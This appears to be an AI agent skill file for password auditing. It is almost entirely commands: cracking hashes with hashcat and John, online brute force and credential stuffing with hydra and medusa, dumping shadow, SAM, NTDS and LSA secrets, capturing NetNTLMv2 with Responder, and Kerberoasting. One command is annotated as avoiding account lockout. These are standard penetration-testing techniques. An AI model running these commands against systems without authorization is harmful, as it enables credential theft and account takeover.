---
name: password-audit
description: "Password security auditing: hash cracking, password policy analysis, brute-force techniques, credential stuffing checks, and password strength auditing. Use when assessing password strength, cracking captured hashes, or testing authentication policies."
---

# Password Auditing Skill

You are performing **password auditing** — assessing the strength of passwords and authentication mechanisms. This includes cracking captured hashes, testing password policies, and identifying weak or reused credentials.

## Hash Cracking

### Hash Identification
```bash
# Identify hash type from format
hashid '$hash'
hash-identifier '$hash'
```

### Hashcat (GPU-Accelerated on WSL2)
```bash
# Requires NVIDIA drivers on Windows (auto-extend to WSL2)
# Check for GPU support
hashcat -I | grep -i "CUDA\|OpenCL"

# Mode reference
hashcat --help | grep -i "ntlm\|sha256\|bcrypt\|md5"

# Common hash modes
# 1000 = NTLM | 5600 = NetNTLMv2 | 1800 = sha512crypt
# 3200 = bcrypt | 1710 = sha512($pass.$salt)

# Dictionary attack (fastest)
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Rule-based (append numbers/special chars)
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (brute-force patterns)
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?d?d?d  # Capital+5lower+3digits

# Combinator (word + word)
hashcat -m 1000 -a 1 hashes.txt words1.txt words2.txt

# Show cracked passwords
hashcat -m 1000 --show hashes.txt

# Potfile management
hashcat -m 1000 --potfile-path custom.pot hashes.txt
```

### John the Ripper
```bash
# Single crack mode (fast)
john --single hashes.txt

# Wordlist mode
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Incremental (brute-force, SLOW)
john --incremental hashes.txt

# Show results
john --show hashes.txt

# Convert formats (for unsupported hash types)
# NTLM
john --format=NT hashes.txt

# Descrypt traditional crypt (DES-based)
john --format=descrypt hashes.txt
```

## Credential Stuffing

```bash
# Check if credentials appear in known breaches (h8mail)
h8mail -t user@example.com -bc "/path/to/breach/*.csv"

# Hydra — online brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$target -t 4 -V
hydra -L users.txt -P passwords.txt rdp://$target -t 1 -V  # single thread = no lockout
hydra -l admin -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Medusa — alternative to hydra
medusa -h $target -u admin -P passwords.txt -M ssh
```

## Password Policy Testing

```bash
# Check domain password policy (SMB)
crackmapexec smb $target -u user -p pass --pass-pol

# Check for accounts with no password expiry
crackmapexec ldap $target -u admin -p password --password-not-required

# Check for empty passwords
crackmapexec smb $target -u users.txt -p '' --continue-on-success
```

## Hash Extraction (Authorized Only)

### Linux
```bash
# Dump from /etc/shadow (need root)
cat /etc/shadow | grep -v '\*\|!'

# Unshadow for John
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

### Windows (via Linux tools, with admin creds)
```bash
# Dump SAM hashes via CrackMapExec
crackmapexec smb $target -u admin -p password --sam

# Dump NTDS.dit (Domain Controller)
crackmapexec smb $dc -u admin -p password --ntds

# Dump LSA secrets
crackmapexec smb $target -u admin -p password --lsa
```

### Network Hash Capture
```bash
# Responder — capture NetNTLMv2 hashes on network
sudo responder -I eth0 -wdv

# Captured hashes in /usr/share/responder/logs/
# Crack with hashcat -m 5600
```

## Kerberos Attack Vectors

```bash
# AS-REP Roasting — find users without pre-auth
crackmapexec ldap $dc -u admin -p password --asreproast asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Kerberoasting — get service account hashes
crackmapexec ldap $dc -u admin -p password --kerberoast kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

## Password Strength Analysis

```bash
# Check password against common patterns
# Use python for entropy calculation
python3 -c "
import math
password = 'yourpassword'
chars = len(set(password))
entropy = len(password) * math.log2(chars)
print(f'Password length: {len(password)}')
print(f'Character set size: {chars}')
print(f'Entropy: {entropy:.1f} bits')
if entropy < 30:
    print('Rating: VERY WEAK — crackable instantly')
elif entropy < 50:
    print('Rating: WEAK — crackable in hours')
elif entropy < 70:
    print('Rating: MODERATE — crackable in weeks')
else:
    print('Rating: STRONG — resistant to offline cracking')
"
```

## Wordlist Management

```bash
# Extract rockyou
gunzip -c /usr/share/wordlists/rockyou.txt.gz > ~/tools/wordlists/rockyou.txt

# Create custom wordlist from target info
cewl https://$target -w custom-wordlist.txt  # crawl site for words

# Combine wordlists
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# Generate mutations with hashcat rules
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule basewords.txt > mutated.txt

# Filter by length (e.g., passwords 8-16 chars)
awk 'length >= 8 && length <= 16' rockyou.txt > filtered.txt
```

## Tool Installation
```bash
# Password auditing tools
sudo apt update && sudo apt install -y \
    john hashcat \
    hydra medusa \
    cewl \
    hashid hash-identifier

# Python tools via pipx
pipx install h8mail crackmapexec

# hashcat rules (included with hashcat package)
ls /usr/share/hashcat/rules/

# Additional wordlists
sudo apt install -y seclists  # includes many password lists
```
